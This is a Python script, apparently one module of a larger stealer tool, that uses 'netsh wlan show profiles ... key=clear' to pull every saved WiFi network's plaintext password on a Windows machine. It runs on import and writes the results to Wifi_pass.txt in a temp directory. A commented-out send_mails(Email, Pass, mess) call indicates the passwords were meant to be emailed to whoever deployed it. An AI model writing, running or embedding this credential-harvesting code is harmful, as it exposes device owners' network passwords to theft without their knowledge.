import subprocess
import re
from savloc import temp
import os



def password():
    temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    data_network = ''
    while temp_out.poll() is None:
        data_network = data_network + temp_out.stdout.readline().decode('utf-8')
        #print(data_network)
    #print(data_network)
    networks = re.findall("(?:Profile\s*:\s)(.*?\\r)",data_network)
    #print(networks)
    mess = "WiFi Password"
    mess = mess + "------------------------------------------\n"
    Wifi_name = "Network\t:\tPassword"
    for i in networks:
        i = i.replace("\r", "")
        Wifi_name = i
        temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = ""
        while temp_out.poll() is None:
            output = output + temp_out.stdout.readline().decode('utf-8')
        #print(output)
        Type_net = re.findall("(?:Type\s*:\s)(.*?\\r)", output)[0]
        password = ""
        pas = re.findall("(?:Key\sContent\s*:\s)(.*?\\r)", output)
        if pas:
            password = pas[0]
        mess = mess + Wifi_name + " ::::: " + password + "\n"
    #print(mess)
    filename = 'Wifi_pass.txt'
    filename = os.path.join(temp(),filename)
    with open(filename,'w') as f:
        f.write(mess)
        f.close()
    #send_mails(Email, Pass, mess)


password()